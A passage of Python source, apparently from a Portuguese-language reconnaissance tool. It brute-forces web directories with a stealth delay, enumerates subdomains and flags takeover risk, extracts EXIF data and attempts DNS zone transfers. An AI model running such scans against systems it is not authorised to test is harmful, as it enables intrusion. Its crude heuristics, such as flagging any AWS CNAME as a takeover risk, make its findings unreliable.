        elif status in [301, 302, 303, 307, 308]:
            result.update(self._analyze_redirect_response(response, url))
        elif status == 401:
            result.update(self._analyze_auth_required(response, url))
        elif status == 405:
            result.update(self._analyze_method_not_allowed(response, url))
        elif status == 500:
            result['notes'].append('Internal Server Error - possível vulnerabilidade')
        
        # Detecta headers interessantes
        interesting_headers = {}
        for header, value in headers.items():
            if header.lower() in ['server', 'x-powered-by', 'x-generator', 'x-drupal-cache']:
                interesting_headers[header] = value
        
        result['interesting_headers'] = interesting_headers
        
        return result
    
    def _analyze_200_response(self, response, url):
        """Analisa resposta 200 OK."""
        content = response.text.lower()
        content_type = response.headers.get('Content-Type', '').lower()
        
        analysis = {
            'directory_type': 'file',
            'notes': []
        }
        
        # Detecta se é um diretório baseado no conteúdo
        if ('index of' in content or 
            'directory listing' in content or
            '<title>index of' in content):
            analysis['directory_type'] = 'directory_listing'
            analysis['notes'].append('Directory listing ativo')
        
        # Detecta tecnologias baseadas no conteúdo
        if 'wp-content' in content or 'wordpress' in content:
            self.detected_technologies.add('wordpress')
            analysis['notes'].append('WordPress detectado')
        elif 'drupal' in content:
            self.detected_technologies.add('drupal')
            analysis['notes'].append('Drupal detectado')
        elif 'joomla' in content:
            self.detected_technologies.add('joomla')
            analysis['notes'].append('Joomla detectado')
        
        # Detecta arquivos sensíveis
        sensitive_indicators = {
            'config': 'Arquivo de configuração',
            'database': 'Arquivo de database',
            'backup': 'Arquivo de backup',
            'admin': 'Painel administrativo',
            'login': 'Página de login',
            '.env': 'Arquivo de ambiente',
            'robots.txt': 'Arquivo robots.txt'
        }
        
        for keyword, description in sensitive_indicators.items():
            if keyword in url.lower():
                analysis['notes'].append(description)
                break
        
        return analysis
    
    def _analyze_403_response(self, response, url):
        """Analisa resposta 403 Forbidden."""
        return {
            'directory_type': 'directory_protected',
            'notes': ['Diretório protegido - potencial interesse']
        }
    
    def _analyze_redirect_response(self, response, url):
        """Analisa respostas de redirecionamento."""
        location = response.headers.get('Location', '')
        
        analysis = {
            'redirect_location': location,
            'directory_type': 'redirect',
            'notes': [f'Redireciona para: {location}']
        }
        
        # Se redireciona para URL com trailing slash, é provavelmente um diretório
        if location.endswith('/') and not url.endswith('/'):
            analysis['directory_type'] = 'directory'
            analysis['notes'].append('Diretório confirmado pelo redirect')
        
        return analysis
    
    def _analyze_auth_required(self, response, url):
        """Analisa resposta 401 Unauthorized."""
        auth_type = response.headers.get('WWW-Authenticate', '')
        
        return {
            'directory_type': 'auth_required',
            'notes': [f'Autenticação requerida: {auth_type}']
        }
    
    def _analyze_method_not_allowed(self, response, url):
        """Analisa resposta 405 Method Not Allowed."""
        allowed_methods = response.headers.get('Allow', '')
        
        return {
            'directory_type': 'method_restricted',
            'notes': [f'Métodos permitidos: {allowed_methods}']
        }
    
    def _load_wordlist(self):
        """Carrega e processa wordlist."""
        if not self.wordlist_path:
            return []
        
        try:
            with open(self.wordlist_path, 'r', errors='ignore') as f:
                words = [line.strip() for line in f 
                        if line.strip() and not line.startswith('#')]
            
            # Remove duplicatas e ordena
            words = list(set(words))
            
            # Adiciona extensões se habilitado
            if self.extension_fuzzing:
                words = self._add_file_extensions(words)
            
            return words
            
        except FileNotFoundError:
            console.print(f"[bold red][!] Wordlist não encontrada: {self.wordlist_path}[/bold red]")
            return []
    
    def _add_file_extensions(self, words):
        """Adiciona extensões de arquivo baseadas nas tecnologias detectadas."""
        extensions = ['.txt', '.html', '.php', '.asp', '.aspx', '.jsp', '.js', '.css']
        
        # Extensões específicas por tecnologia
        if 'wordpress' in self.detected_technologies:
            extensions.extend(['.php', '.inc', '.conf'])
        if 'drupal' in self.detected_technologies:
            extensions.extend(['.module', '.install', '.inc'])
        if 'asp' in self.detected_technologies:
            extensions.extend(['.asp', '.aspx', '.config'])
        
        extended_words = words.copy()
        
        # Adiciona extensões apenas para palavras sem extensão
        for word in words:
            if '.' not in word.split('/')[-1]:  # Se não tem extensão
                for ext in extensions:
                    extended_words.append(f"{word}{ext}")
        
        return extended_words
    
    def scan(self, recursive=False, max_depth=3, stealth=False, output_format='table'):
        """Executa o scan principal de diretórios."""
        self.recursive_enabled = recursive
        self.max_depth = max_depth
        self.stealth_mode = stealth
        
        console.print("-" * 60)
        console.print(f"[*] Scanner Avançado de Diretórios - Spectra v3.2.6")
        console.print(f"[*] Alvo: [bold cyan]{self.base_url}[/bold cyan]")
        console.print(f"[*] Wordlist: [bold cyan]{self.wordlist_path}[/bold cyan]")
        console.print(f"[*] Workers: [bold cyan]{self.workers}[/bold cyan]")
        console.print(f"[*] Timeout: [bold cyan]{self.timeout}s[/bold cyan]")
        
        if recursive:
            console.print(f"[*] Modo Recursivo: [bold green]Ativado[/bold green] (Máx: {max_depth})")
        else:
            console.print(f"[*] Modo Recursivo: [bold red]Desativado[/bold red]")
        
        if stealth:
            console.print(f"[*] Modo Stealth: [bold yellow]Ativado[/bold yellow]")
        
        console.print("-" * 60)
        
        # Setup inicial
        self._setup_session()
        self._detect_waf()
        self._detect_baseline_404()
        
        # Carrega wordlist
        words = self._load_wordlist()
        if not words:
            console.print("[bold red][!] Nenhuma palavra encontrada na wordlist[/bold red]")
            return []
        
        console.print(f"[*] Carregadas [bold cyan]{len(words)}[/bold cyan] palavras para teste")
        
        # Executa scan principal
        self.results = self._scan_directory(self.base_url, words, depth=1)
        
        # Exibe resultados
        self._display_results(output_format)
        
        # Estatísticas finais
        console.print("-" * 60)
        console.print(f"[*] Scan concluído:")
        console.print(f"    • {len(self.results)} recursos encontrados")
        console.print(f"    • {self.requests_made} requisições realizadas")
        console.print(f"    • {self.false_positives_filtered} falsos positivos filtrados")
        console.print(f"    • {len(self.errors)} erros encontrados")
        
        if self.errors:
            console.print(f"[bold yellow][!] Primeiros 5 erros:[/bold yellow]")
            for error in self.errors[:5]:
                console.print(f"    [dim]{error}[/dim]")
        
        console.print("-" * 60)
        
        return self.results
    
    def _scan_directory(self, base_url, words, depth=1, visited=None):
        """Executa scan de um diretório específico."""
        if visited is None:
            visited = set()
        
        if depth > self.max_depth:
            return []
        
        results = []
        
        # Cria URLs para testar
        urls_to_test = []
        for word in words:
            url = f"{base_url}/{word}"
            if url not in visited:
                urls_to_test.append(url)
                visited.add(url)
        
        if not urls_to_test:
            return results
        
        console.print(f"[*] Testando {len(urls_to_test)} URLs (profundidade {depth})...")
        
        # Executa requests em paralelo
        with ThreadPoolExecutor(max_workers=self.workers) as executor:
            future_to_url = {
                executor.submit(self._make_request, url): url 
                for url in urls_to_test
            }
            
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TimeRemainingColumn(),
                console=console
            ) as progress:
                task = progress.add_task(f"[green]Scan profundidade {depth}...", total=len(future_to_url))
                
                directories_found = []
                
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    response = future.result()
                    
                    # Analisa resposta
                    analysis = self._analyze_response(response, url)
                    
                    if analysis:
                        results.append(analysis)
                        
                        # Mostra resultado em tempo real
                        status = analysis['status']
                        notes = ' | '.join(analysis['notes']) if analysis['notes'] else ''
                        
                        if status == 200:
                            color = "green"
                        elif status == 403:
                            color = "yellow"
                        elif str(status).startswith('3'):
                            color = "cyan"
                        else:
                            color = "white"
                        
                        console.print(f"[bold {color}][+] {url} ({status})[/bold {color}] {notes}")
                        
                        # Se é um diretório e modo recursivo está ativo
                        if (self.recursive_enabled and 
                            analysis['directory_type'] in ['directory', 'directory_listing'] and
                            depth < self.max_depth):
                            directories_found.append(url)
                    
                    progress.update(task, advance=1)
                    
                    if self.stealth_mode:
                        time.sleep(0.1)  # Delay em modo stealth
        
        # Scan recursivo dos diretórios encontrados
        if self.recursive_enabled and directories_found:
            console.print(f"[*] Encontrados {len(directories_found)} diretórios para scan recursivo")
            
            for directory in directories_found:
                recursive_results = self._scan_directory(directory, words, depth + 1, visited)
                results.extend(recursive_results)
        
        return results
    
    def _display_results(self, output_format='table'):
        """Exibe resultados em diferentes formatos."""
        if output_format == 'json':
            import json
            print(json.dumps(self.results, indent=2, default=str))
            return
        elif output_format == 'xml':
            print(self._generate_xml_output())
            return
        
        if not self.results:
            console.print("[bold yellow][-] Nenhum recurso encontrado.[/bold yellow]")
            return
        
        # Organiza resultados por status
        self.results.sort(key=lambda x: (x['status'], x['url']))
        
        # Tabela principal
        table = Table(title=f"Recursos Descobertos - {self.base_url}")
        table.add_column("URL", style="cyan", no_wrap=False)
        table.add_column("Status", justify="center", style="green")
        table.add_column("Tamanho", justify="right", style="yellow")
        table.add_column("Tipo", style="magenta")
        table.add_column("Notas", style="dim", max_width=40)
        
        for result in self.results:
            url = result['url']
            status = str(result['status'])
            size = str(result['length'])
            dir_type = result['directory_type']
            notes = ' | '.join(result['notes']) if result['notes'] else ''
            
            table.add_row(url, status, size, dir_type, notes)
        
        console.print(table)
        
        # Estatísticas por tipo
        type_stats = Counter(r['directory_type'] for r in self.results)
        if type_stats:
            console.print(f"\n[*] Tipos encontrados:")
            for dir_type, count in type_stats.most_common():
                console.print(f"    • {dir_type}: {count}")
        
        # Tecnologias detectadas
        if self.detected_technologies:
            console.print(f"\n[*] Tecnologias detectadas: [cyan]{', '.join(self.detected_technologies)}[/cyan]")
    
    def _generate_xml_output(self):
        """Gera output em formato XML."""
        xml_lines = ['<?xml version="1.0" encoding="UTF-8"?>']
        xml_lines.append('<spectra_directory_scan>')
        xml_lines.append(f'  <target>{self.base_url}</target>')
        xml_lines.append(f'  <results count="{len(self.results)}">')
        
        for result in self.results:
            xml_lines.append('    <resource>')
            xml_lines.append(f'      <url>{result["url"]}</url>')
            xml_lines.append(f'      <status>{result["status"]}</status>')
            xml_lines.append(f'      <length>{result["length"]}</length>')
            xml_lines.append(f'      <type>{result["directory_type"]}</type>')
            xml_lines.append('    </resource>')
        
        xml_lines.append('  </results>')
        xml_lines.append('</spectra_directory_scan>')
        
        return '\n'.join(xml_lines)

def check_directory(url, session):
    """Função legacy para compatibilidade - usa a nova implementação."""
    scanner = AdvancedDirectoryScanner(url.rsplit('/', 1)[0], None)
    scanner.session = session
    response = scanner._make_request(url)
    
    if response and response.status_code != 404:
        location = response.headers.get('Location', '')
        return (url, response.status_code, location)
    
    return None

def advanced_directory_scan(base_url, wordlist_path, workers=30, timeout=10, 
                          recursive=False, max_depth=3, stealth=False, 
                          extension_fuzzing=True, output_format='table'):
    """Interface para o scanner avançado de diretórios."""
    
    # Normaliza URL
    if not re.match(r'^https?://', base_url):
        base_url = 'http://' + base_url
    base_url = base_url.rstrip('/')
    
    # Cria e configura scanner
    scanner = AdvancedDirectoryScanner(base_url, wordlist_path, workers, timeout)
    scanner.extension_fuzzing = extension_fuzzing
    
    # Executa scan
    return scanner.scan(recursive, max_depth, stealth, output_format)

def discover_directories(base_url, wordlist, workers=30, recursive=False, max_depth=2, current_depth=1, visited_urls=None, internal_call=False):
    """Função legacy para compatibilidade - usa implementação melhorada."""
    if visited_urls is None:
        visited_urls = set()

    if not re.match(r'^https?://', base_url):
        base_url = 'http://' + base_url
    if base_url.endswith('/'):
        base_url = base_url[:-1]

    if not internal_call:
        console.print("-" * 60)
        console.print(f"[*] Alvo Principal: [bold cyan]{base_url}[/bold cyan]")
        if isinstance(wordlist, str):
            console.print(f"[*] Wordlist: [bold cyan]{wordlist}[/bold cyan]")
        console.print(f"[*] Modo Recursivo: {'[bold green]Ativado[/bold green]' if recursive else '[bold red]Desativado[/bold red]'}")
        if recursive:
            console.print(f"[*] Profundidade Máxima: [bold cyan]{max_depth}[/bold cyan]")
        console.print("-" * 60)

    words = []
    if isinstance(wordlist, str):
        try:
            with open(wordlist, 'r', errors='ignore') as f:
                words = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except FileNotFoundError:
            console.print(f"[bold red][!] Erro: O ficheiro da wordlist '{wordlist}' não foi encontrado.[/bold red]")
            return []
    elif isinstance(wordlist, list):
        words = wordlist

    if not internal_call:
        console.print(f"[*] Nível {current_depth}: Varrendo {len(words)} palavras em [cyan]{base_url}[/cyan]...")
    
    found_paths = []
    directories_to_scan_next = []
    
    with requests.Session() as session:
        session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'})
        with ThreadPoolExecutor(max_workers=workers) as executor:
            urls_to_check = [f"{base_url}/{word}" for word in words]
            urls_to_check = [url for url in urls_to_check if url not in visited_urls]
            future_to_url = {executor.submit(check_directory, url, session): url for url in urls_to_check}
            
            for url in urls_to_check:
                visited_urls.add(url)
            
            def process_result(result):
                if result:
                    url, status_code, location = result
                    is_directory = (str(status_code).startswith('3') and location.endswith('/')) or (status_code == 200 and url.endswith('/'))
                    
                    if not internal_call:
                        color = "green" if status_code == 200 else "yellow" if str(status_code).startswith('3') else "white"
                        console.print(f"[bold {color}][+] Encontrado: {url} (Status: {status_code})[/bold {color}]")
                    
                    found_paths.append(result)
                    
                    if recursive and is_directory and current_depth < max_depth:
                        next_scan_url = url
                        if location:
                            next_scan_url = urljoin(base_url, location)
                        
                        directories_to_scan_next.append(next_scan_url)

            if internal_call:
                for future in as_completed(future_to_url):
                    process_result(future.result())
            else:
                progress_bar_desc = f"Nível {current_depth} Scan"
                with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=console, transient=True) as progress:
                    task = progress.add_task(f"[green]{progress_bar_desc}", total=len(future_to_url))
                    for future in as_completed(future_to_url):
                        process_result(future.result())
                        progress.update(task, advance=1)

    for directory_url in directories_to_scan_next:
        found_paths.extend(discover_directories(directory_url, wordlist, workers, recursive, max_depth, current_depth + 1, visited_urls, internal_call=False))
    
    return found_paths

# --- MÓDULO 4: EXTRATOR DE METADADOS ---

def extract_metadata(image_url):
    """Descarrega uma imagem de um URL e extrai os seus metadados EXIF."""
    console.print("-" * 60)
    console.print(f"[*] A extrair metadados de: [bold cyan]{image_url}[/bold cyan]")
    console.print("-" * 60)
    try:
        with console.status("[bold green]A descarregar e analisar a imagem...[/bold green]"):
            response = requests.get(image_url, timeout=10, verify=False)
            response.raise_for_status()
            img = Image.open(BytesIO(response.content))
            exif_data = img._getexif()

        if not exif_data:
            console.print("[bold yellow][-] Não foram encontrados metadados EXIF nesta imagem.[/bold yellow]")
            return
            
        table = Table(title="Metadados EXIF Encontrados")
        table.add_column("Tag", justify="right", style="cyan", no_wrap=True)
        table.add_column("Valor", style="magenta")
        for tag_id, value in exif_data.items():
            tag_name = TAGS.get(tag_id, tag_id)
            value_str = value.decode('utf-8', errors='ignore') if isinstance(value, bytes) else str(value)
            table.add_row(str(tag_name), value_str)
        console.print(table)

    except requests.exceptions.RequestException as e:
        console.print(f"[bold red][!] Erro ao descarregar a imagem: {e}[/bold red]")
    except IOError:
        console.print("[bold red][!] Erro: O ficheiro não é uma imagem válida ou está corrompido.[/bold red]")
    except Exception as e:
        console.print(f"[bold red][!] Ocorreu um erro inesperado: {e}[/bold red]")
    console.print("-" * 60)

# --- MÓDULO 5: SCANNER DE SUBDOMÍNIOS ---

def check_subdomain(subdomain, domain):
    """Verifica se um subdomínio existe com análise avançada de DNS."""
    if not subdomain:
        return None
    full_domain = f"{subdomain}.{domain}"
    try:
        # Resolução básica
        ip_address = socket.gethostbyname(full_domain)
        
        # Análise avançada de DNS
        dns_info = _analyze_subdomain_dns(full_domain)
        
        return {
            'domain': full_domain,
            'ip': ip_address,
            'dns_info': dns_info,
            'status': 'active'
        }
    except (socket.gaierror, UnicodeEncodeError):
        return None

def _analyze_subdomain_dns(domain):
    """Analisa registros DNS de um subdomínio."""
    dns_info = {
        'cname': None,
        'mx_records': [],
        'txt_records': [],
        'has_wildcard': False,
        'takeover_risk': False,
        'cloud_service': None
    }
    
    try:
        # Verifica CNAME
        try:
            cname_answer = dns.resolver.resolve(domain, 'CNAME')
            dns_info['cname'] = str(cname_answer[0]).rstrip('.')
            
            # Verifica potential subdomain takeover
            dns_info['takeover_risk'] = _check_subdomain_takeover(dns_info['cname'])
            dns_info['cloud_service'] = _identify_cloud_service(dns_info['cname'])
            
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            pass
        
        # Verifica MX records
        try:
            mx_answers = dns.resolver.resolve(domain, 'MX')
            dns_info['mx_records'] = [str(mx.exchange).rstrip('.') for mx in mx_answers]
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            pass
        
        # Verifica TXT records
        try:
            txt_answers = dns.resolver.resolve(domain, 'TXT')
            dns_info['txt_records'] = [str(txt).strip('"') for txt in txt_answers]
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            pass
            
    except Exception:
        pass
    
    return dns_info

def _check_subdomain_takeover(cname):
    """Verifica se um CNAME aponta para serviços vulneráveis a subdomain takeover."""
    if not cname:
        return False
    
    # Padrões conhecidos de subdomain takeover
    vulnerable_patterns = [
        'amazonaws.com',
        'azurewebsites.net',
        'herokuapp.com',
        'github.io',
        'netlify.app',
        'vercel.app',
        'surge.sh',
        'bitbucket.io',
        'gitlab.io',
        'wordpress.com',
        'tumblr.com',
        'shopify.com'
    ]
    
    return any(pattern in cname.lower() for pattern in vulnerable_patterns)

def _identify_cloud_service(cname):
    """Identifica o serviço de cloud baseado no CNAME."""
    if not cname:
        return None
    
    cloud_patterns = {
        'amazonaws.com': 'AWS',
        'azurewebsites.net': 'Azure',
        'googleapis.com': 'Google Cloud',
        'herokuapp.com': 'Heroku',
        'netlify.app': 'Netlify',
        'vercel.app': 'Vercel',
        'github.io': 'GitHub Pages',
        'cloudflare.net': 'Cloudflare',
        'fastly.com': 'Fastly'
    }
    
    for pattern, service in cloud_patterns.items():
        if pattern in cname.lower():
            return service
    
    return None

def discover_subdomains(domain, wordlist_path, workers=100):
    """Executa a varredura avançada de subdomínios com análise de segurança."""
    console.print("-" * 60)
    console.print(f"[*] Domínio Alvo: [bold cyan]{domain}[/bold cyan]")
    console.print(f"[*] Wordlist: [bold cyan]{wordlist_path}[/bold cyan]")
    console.print("-" * 60)
    
    # Primeiro verifica wildcard DNS
    wildcard_result = _check_dns_wildcard(domain)
    if wildcard_result:
        console.print(f"[bold yellow][!] Wildcard DNS detectado: {wildcard_result}[/bold yellow]")
        console.print("[*] Continuando varredura com filtro de wildcard...")
    
    try:
        with open(wordlist_path, 'r', errors='ignore') as f:
            subdomains = [line.strip() for line in f if line.strip() and not line.startswith('#') and line.strip() not in ('.', '..')]
    except FileNotFoundError:
        console.print(f"[bold red][!] Erro: O ficheiro da wordlist '{wordlist_path}' não foi encontrado.[/bold red]")
        return
    
    console.print(f"[*] A iniciar a varredura com {len(subdomains)} palavras...")
    found_subdomains = []
    takeover_risks = []
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        future_to_subdomain = {executor.submit(check_subdomain, sub, domain): sub for sub in subdomains}
        
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=console) as progress:
            task = progress.add_task("[green]Buscando Subdomínios...", total=len(subdomains))
            for future in as_completed(future_to_subdomain):
                result = future.result()
                if result:
                    # Filtra wildcard se necessário
                    if wildcard_result and result['ip'] == wildcard_result:
                        progress.update(task, advance=1)
                        continue
                    
                    # Exibe resultado com informações avançadas
                    status_info = []
                    if result['dns_info']['cloud_service']:
                        status_info.append(f"[blue]{result['dns_info']['cloud_service']}[/blue]")
                    if result['dns_info']['takeover_risk']:
                        status_info.append("[bold red]TAKEOVER RISK[/bold red]")
                        takeover_risks.append(result)
                    if result['dns_info']['cname']:
                        status_info.append(f"CNAME: {result['dns_info']['cname']}")
                    
                    status_str = f" ({' | '.join(status_info)})" if status_info else ""
                    console.print(f"[bold green][+] {result['domain']} -> {result['ip']}{status_str}[/bold green]")
                    found_subdomains.append(result)
                progress.update(task, advance=1)

    console.print("-" * 60)
    console.print("[*] Varredura de subdomínios concluída.")
    
    if found_subdomains:
        # Tabela principal de subdomínios
        table = Table(title=f"Relatório de Subdomínios para {domain}")
        table.add_column("Subdomínio", style="cyan")
        table.add_column("IP", style="magenta")
        table.add_column("Cloud Service", style="blue")
        table.add_column("CNAME", style="yellow")
        table.add_column("Status", style="green")
        
        for result in sorted(found_subdomains, key=lambda x: x['domain']):
            cloud_service = result['dns_info']['cloud_service'] or 'N/A'
            cname = result['dns_info']['cname'] or 'N/A'
            status = "🔴 TAKEOVER RISK" if result['dns_info']['takeover_risk'] else "✅ OK"
            
            table.add_row(result['domain'], result['ip'], cloud_service, cname, status)
        
        console.print(table)
        
        # Relatório de segurança
        if takeover_risks:
            console.print("\n[bold red]⚠️  ALERTAS DE SEGURANÇA[/bold red]")
            risk_table = Table(title="Subdomínios com Risco de Takeover")
            risk_table.add_column("Subdomínio", style="red")
            risk_table.add_column("CNAME Vulnerável", style="yellow")
            risk_table.add_column("Serviço", style="blue")
            
            for risk in takeover_risks:
                risk_table.add_row(
                    risk['domain'],
                    risk['dns_info']['cname'],
                    risk['dns_info']['cloud_service'] or 'Desconhecido'
                )
            
            console.print(risk_table)
            console.print("[bold red]⚠️  RECOMENDAÇÃO: Verificar se estes subdomínios estão ativos nos serviços de destino[/bold red]")
        
        # Estatísticas
        console.print(f"\n[*] Total encontrado: [bold cyan]{len(found_subdomains)}[/bold cyan] subdomínios")
        cloud_services = {}
        for result in found_subdomains:
            service = result['dns_info']['cloud_service']
            if service:
                cloud_services[service] = cloud_services.get(service, 0) + 1
        
        if cloud_services:
            console.print("[*] Serviços de cloud detectados:")
            for service, count in cloud_services.items():
                console.print(f"    • {service}: {count} subdomínio(s)")
                
    else:
        console.print(f"[bold yellow][-] Nenhum subdomínio encontrado com esta wordlist.[/bold yellow]")
    console.print("-" * 60)

def _check_dns_wildcard(domain):
    """Verifica se o domínio tem wildcard DNS configurado."""
    import random
    import string
    
    # Gera subdomínio aleatório
    random_subdomain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=20))
    test_domain = f"{random_subdomain}.{domain}"
    
    try:
        ip_address = socket.gethostbyname(test_domain)
        return ip_address  # Retorna IP do wildcard
    except (socket.gaierror, UnicodeEncodeError):
        return None  # Sem wildcard

# --- MÓDULO 6: CONSULTA DE DNS ---

def query_dns(domain, record_type):
    """Consulta avançada de registros DNS com análise de vulnerabilidades."""
    console.print("-" * 60)
    console.print(f"[*] Consultando registros para [bold cyan]{domain}[/bold cyan]")
    console.print("-" * 60)

    record_types = ['A', 'AAAA', 'MX', 'TXT', 'NS', 'CNAME', 'SOA'] if record_type.upper() == 'ALL' else [record_type.upper()]
    
    resolver = dns.resolver.Resolver()
    resolver.lifetime = 10
    
    # Análise de vulnerabilidades DNS
    vulnerabilities = []
    nameservers = []

    with console.status("[bold green]Consultando registros DNS...[/bold green]") as status:
        for r_type in record_types:
            status.update(f"[bold green]Consultando registro {r_type}...[/bold green]")
            try:
                answers = resolver.resolve(domain, r_type)
                
                table = Table(title=f"Registros {r_type} para {domain}")
                
                if r_type == 'MX':
                    table.add_column("Prioridade", style="cyan", justify="center")
                    table.add_column("Servidor de E-mail", style="magenta")
                    table.add_column("Análise", style="yellow")
                    mx_records = sorted([(rdata.preference, str(rdata.exchange)) for rdata in answers])
                    for preference, exchange in mx_records:
                        analysis = _analyze_mx_record(exchange)
                        table.add_row(str(preference), exchange, analysis)
                        
                elif r_type == 'TXT':
                    table.add_column("Registro TXT", style="magenta")
                    table.add_column("Tipo", style="yellow")
                    for rdata in answers:
                        text = b''.join(rdata.strings).decode('utf-8', errors='ignore')
                        txt_type = _analyze_txt_record(text)
                        table.add_row(text, txt_type)
                        
                elif r_type == 'NS':
                    table.add_column("Nameserver", style="magenta")
                    table.add_column("IP", style="cyan")
                    table.add_column("Provedor", style="yellow")
                    for rdata in answers:
                        ns = str(rdata).rstrip('.')
                        nameservers.append(ns)
                        ns_ip = _resolve_nameserver_ip(ns)
                        provider = _identify_dns_provider(ns)
                        table.add_row(ns, ns_ip or "N/A", provider or "Desconhecido")
                        
                elif r_type == 'SOA':
                    table.add_column("Campo", style="cyan")
                    table.add_column("Valor", style="magenta")
                    for rdata in answers:
                        table.add_row("Nameserver Primário", str(rdata.mname))
                        table.add_row("Email Responsável", str(rdata.rname))
                        table.add_row("Serial", str(rdata.serial))
                        table.add_row("Refresh", f"{rdata.refresh}s")
                        table.add_row("Retry", f"{rdata.retry}s")
                        table.add_row("Expire", f"{rdata.expire}s")
                        table.add_row("TTL Mínimo", f"{rdata.minimum}s")
                        
                else:
                    table.add_column("Valor", style="magenta")
                    table.add_column("Análise", style="yellow")
                    for rdata in answers:
                        value = str(rdata)
                        analysis = ""
                        if r_type == 'A':
                            analysis = _analyze_ip_address(value)
                        elif r_type == 'CNAME':
                            analysis = _analyze_cname_record(value)
                        table.add_row(value, analysis or "N/A")
                
                console.print(table)

            except dns.resolver.NoAnswer:
                console.print(f"[bold yellow][-] Nenhum registro {r_type} encontrado para {domain}.[/bold yellow]")
            except dns.resolver.NXDOMAIN:
                console.print(f"[bold red][!] Erro: O domínio {domain} não existe.[/bold red]")
                break 
            except dns.resolver.LifetimeTimeout:
                console.print(f"[bold red][!] Erro ao consultar {r_type}: O tempo para a consulta DNS esgotou (timeout).[/bold red]")
            except Exception as e:
                console.print(f"[bold red][!] Erro ao consultar {r_type}: {e}[/bold red]")
            console.print()
    
    # Análise de vulnerabilidades DNS
    console.print("[bold cyan]🔍 ANÁLISE DE SEGURANÇA DNS[/bold cyan]")
    console.print("-" * 60)
    
    # Verifica Zone Transfer
    if nameservers:
        zone_transfer_results = _check_zone_transfer(domain, nameservers)
        if zone_transfer_results:
            console.print("[bold red]⚠️  VULNERABILIDADE: Zone Transfer habilitado![/bold red]")
            for ns, status in zone_transfer_results.items():
                if status == "vulnerable":
                    console.print(f"    • {ns}: [bold red]VULNERÁVEL[/bold red]")
                else:
                    console.print(f"    • {ns}: [green]Protegido[/green]")
        else:
            console.print("[green]✅ Zone Transfer: Protegido[/green]")
    
    # Verifica DNS Cache Poisoning
    cache_poisoning_risk = _check_dns_cache_poisoning(domain)
    if cache_poisoning_risk:
        console.print(f"[bold yellow]⚠️  DNS Cache Poisoning: {cache_poisoning_risk}[/bold yellow]")
    else:
        console.print("[green]✅ DNS Cache Poisoning: Baixo risco[/green]")
    
    # Verifica DNSSEC
    dnssec_status = _check_dnssec(domain)
    if dnssec_status:
        console.print(f"[green]✅ DNSSEC: {dnssec_status}[/green]")
    else:
        console.print("[bold yellow]⚠️  DNSSEC: Não configurado[/bold yellow]")
    
    console.print("-" * 60)

def _analyze_mx_record(mx_server):
    """Analisa registro MX para identificar provedor de email."""
    mx_patterns = {
        'google.com': 'Google Workspace',
        'outlook.com': 'Microsoft 365',
        'zoho.com': 'Zoho Mail',
        'protonmail.ch': 'ProtonMail',
        'amazonaws.com': 'Amazon SES'
    }
    
    for pattern, provider in mx_patterns.items():
        if pattern in mx_server.lower():
            return provider
    return "Personalizado"

def _analyze_txt_record(txt_record):
    """Analisa registro TXT para identificar tipo."""
    txt_record_lower = txt_record.lower()
    
    if txt_record_lower.startswith('v=spf1'):
        return "SPF"
    elif txt_record_lower.startswith('v=dmarc1'):
        return "DMARC"
    elif txt_record_lower.startswith('v=dkim1'):
        return "DKIM"
    elif 'google-site-verification' in txt_record_lower:
        return "Google Verification"
    elif 'facebook-domain-verification' in txt_record_lower:
        return "Facebook Verification"
    elif '_domainkey' in txt_record_lower:
        return "DKIM Key"
    return "Outro"

def _resolve_nameserver_ip(nameserver):
    """Resolve IP do nameserver."""
    try:
        return socket.gethostbyname(nameserver)
    except:
        return None

def _identify_dns_provider(nameserver):
    """Identifica provedor DNS baseado no nameserver."""
    dns_providers = {
        'cloudflare.com': 'Cloudflare',
        'google.com': 'Google Cloud DNS',
        'amazonaws.com': 'Amazon Route 53',
        'azure-dns.com': 'Microsoft Azure DNS',
        'digitalocean.com': 'DigitalOcean DNS',
        'linode.com': 'Linode DNS',
        'godaddy.com': 'GoDaddy DNS',
        'namecheap.com': 'Namecheap DNS'
    }
    
    for pattern, provider in dns_providers.items():
        if pattern in nameserver.lower():
            return provider
    return None

def _analyze_ip_address(ip):
    """Analisa endereço IP para identificar provedor."""
    # Ranges conhecidos de provedores cloud
    ip_ranges = {
        '104.16.': 'Cloudflare',
        '104.17.': 'Cloudflare',
        '172.64.': 'Cloudflare',
        '13.107.': 'Microsoft Azure',
        '20.': 'Microsoft Azure',
        '52.': 'Amazon AWS',
        '54.': 'Amazon AWS',
        '35.': 'Google Cloud'
    }
    
    for ip_prefix, provider in ip_ranges.items():
        if ip.startswith(ip_prefix):
            return provider
    return "IP próprio"

def _analyze_cname_record(cname):
    """Analisa registro CNAME para identificar serviço."""
    cname_patterns = {
        'cloudflare.net': 'Cloudflare',
        'azurewebsites.net': 'Azure App Service',
        'amazonaws.com': 'Amazon AWS',
        'herokuapp.com': 'Heroku',
        'github.io': 'GitHub Pages',
        'netlify.app': 'Netlify'
    }
    
    for pattern, service in cname_patterns.items():
        if pattern in cname.lower():
            return service
    return "Serviço personalizado"

def _check_zone_transfer(domain, nameservers):
    """Verifica se zone transfer está habilitado."""
    results = {}
    
    for ns in nameservers[:3]:  # Testa apenas os primeiros 3 NS
        try:
            # Tenta zone transfer
            transfer = dns.zone.from_xfr(dns.query.xfr(ns, domain, timeout=5))
            if transfer:
                results[ns] = "vulnerable"
            else:
                results[ns] = "protected"
        except:
            results[ns] = "protected"
    
    return results

def _check_dns_cache_poisoning(domain):
    """Verifica vulnerabilidade a DNS cache poisoning."""
    try:
        # Verifica se usa DNS recursivo aberto
